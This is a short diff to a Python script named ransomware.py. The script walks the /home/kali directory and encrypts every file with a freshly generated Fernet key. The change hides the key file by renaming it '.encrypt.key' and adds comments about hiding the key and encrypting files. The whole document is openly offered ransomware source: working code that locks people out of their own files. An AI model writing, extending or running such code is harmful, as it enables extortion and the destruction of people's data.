@@ -5,12 +5,12 @@ main_dir = "/home/kali"
 
 key = Fernet.generate_key()
 
-with open("encrypt.key", "wb") as enckey:
+with open(".encrypt.key", "wb") as enckey: #Creates a hidden key file
     enckey.write(key)
 
 for subdir, dirs, files in os.walk(main_dir):
     for file in files:
-        if file == "ransomware.py" or file == "decrypt.py" or file == "encrypt.key":
+        if file == "ransomware.py" or file == "decrypt.py" or file == ".encrypt.key":
             continue
         else:
             try:
@@ -18,6 +18,6 @@ for subdir, dirs, files in os.walk(main_dir):
                     contents = usrFile.read()
                 encrypted_content = Fernet(key).encrypt(contents)
                 with open(file, "wb") as usrFile:
-                    usrFile.write(encrypted_content)
+                    usrFile.write(encrypted_content) #Encrypts files except root files
             except:
                 pass
